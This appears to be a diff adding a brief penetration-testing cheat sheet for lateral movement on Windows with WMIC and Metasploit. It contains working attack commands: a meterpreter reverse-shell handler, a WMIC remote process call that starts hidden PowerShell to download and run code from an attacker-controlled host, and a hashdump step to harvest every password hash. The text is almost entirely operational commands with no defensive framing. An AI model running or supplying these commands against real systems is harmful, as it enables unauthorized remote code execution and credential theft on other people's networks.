@@ -1,0 +1,28 @@
+Lateral Movement Using WMIC
+
+run a metasploit console 
+    msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 192.168.X.206; set LPORT 80; set ExitOnSession false; run -j"
+
+test wmic connectivity
+    wmic /node:192.168.3.215 "ntdomain"
+
+reserve shell
+        use exploit/multi/script/web_delivery 
+        set target 2
+        set PAYLOAD windows/x64/meterpreter/reverse_tcp
+        set LHOST 192.168.X.206 	
+        set URIPATH /
+        set LPORT 443
+        run
+
+create a connection
+    wmic /node:192.168.3.215 process call create "powershell.exe -NoP -sta -NonI -W Hidden iex (New-Object Net.WebClient).DownloadString('http://192.168.X.206:8080')"
+
+
+metasploit running connected
+    sessions -i $SESSIONID
+    getuid
+    sysinfo
+    hashdump - collect all hashes!!
+
+    
